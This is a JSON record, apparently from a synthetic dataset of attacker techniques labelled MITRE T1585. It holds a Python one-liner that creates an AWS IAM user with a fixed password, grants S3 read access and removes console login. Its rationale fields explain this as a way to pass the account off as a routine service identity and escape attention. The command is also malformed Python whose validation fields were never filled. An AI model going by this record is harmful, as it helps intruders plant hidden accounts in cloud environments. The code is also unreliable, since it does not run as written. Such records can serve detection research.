{
  "technique_id": "T1585",
  "platform": "Cloud",
  "shell": "Python",
  "command": "python3 -c \"import boto3, json; iam=boto3.client('iam'); user='temp.research'; try: iam.create_user(UserName=user, Tags=[{'Key':'Department','Value':'Insights'},{'Key':'ContractEnd','Value':'2026-03-31'}]); iam.create_login_profile(UserName=user, Password='TempUser!2025', PasswordResetRequired=True); iam.attach_user_policy(UserName=user, PolicyArn='arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess'); except iam.exceptions.EntityAlreadyExistsException: pass; # convert to API-only service persona to blend with automation patterns\ntry: iam.delete_login_profile(UserName=user); login_removed=True\nexcept iam.exceptions.NoSuchEntityException: login_removed=False\nprint(json.dumps({'action':'convert_persona_to_api_only','user':user,'policy_attached':'AmazonS3ReadOnlyAccess','console_login_removed':login_removed}))\"",
  "explanation": "Creates or adjusts a low-privilege user and removes console login to make the persona appear as a routine API-only service identity.",
  "rationale_steps": [
    "API-only users are common for automation and reduce console artifacts that could draw attention.",
    "Keep read-only S3 access to maintain a plausible, minimal use case."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1585-5eabdd9a-e7381d34",
  "source_prompt_hash": "5eabdd9a",
  "timestamp_utc": "2025-09-30T07:26:07.139717Z",
  "validation": {
    "syntax_ok": null,
    "llm_judge": null,
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}